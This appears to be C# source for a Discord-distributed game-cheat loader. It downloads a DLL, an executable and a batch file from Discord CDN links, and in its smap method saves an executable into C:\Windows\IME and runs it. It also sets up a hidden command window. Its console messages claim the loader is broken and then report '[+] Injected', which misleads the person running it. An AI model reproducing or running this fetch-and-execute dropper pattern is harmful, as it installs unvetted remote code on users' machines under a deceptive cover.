/// https://discord.gg/uWEgh23yqp

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace vital1310
{
	internal class monky1
	{
		public static void InjectOrMonkey()
		{
			Console.ForegroundColor = ConsoleColor.Cyan;
			WebClient webClient = new WebClient();
			Directory.CreateDirectory("C:\\Users\\Public\\Documents\\Cheat");
			string text = "C:\\Users\\Public\\Documents\\Cheat\\test.dll"; 
			string text1 = "C:\\Users\\Public\\Documents\\Cheat\\smap.exe";
			string text2 = "C:\\Users\\Public\\Documents\\Cheat\\inject.bat";
			string text3 = "C:\\Users\\Public\\Documents\\Cheat\\README.txt";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/854882593730986014/875842255817158696/README.txt", text3);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/854882593730986014/875827203441590372/inject.bat", text2);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/854882593730986014/875780033438965770/smap.exe", text1);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/854882593730986014/875820097577582602/test.dll", text);
			Process process = new Process();
			Thread.Sleep(3000);
			process.Close();
			Console.Clear();
			Thread.Sleep(500);
			Console.ForegroundColor = ConsoleColor.Red;
			monky2.Print("\n[-] LOADER IS CURRENTLY BROKEN");
			Thread.Sleep(2000);
			monky2.Print("\n[-] YOU WILL HAVE TO LOAD THE CHEAT MANUALLY");
			Console.WriteLine(" ");
			Console.ForegroundColor = ConsoleColor.Cyan;
			Thread.Sleep(2500);
			monky2.Print("\n Press [Enter]");
			Console.ReadLine();
			Process.Start(text3);
			Thread.Sleep(4000);
			Console.WriteLine("[+] Injected");
			Thread.Sleep(100);
			monky2.Print("\n Press [Enter] to Close Console");
		}

		public static void smap()
		{
			WebClient webClient = new WebClient();
			string fileName = "C:\\Windows\\IME\\smap.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/854882593730986014/875780033438965770/smap.exe", fileName);
			Process.Start(fileName);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		}
	}
}
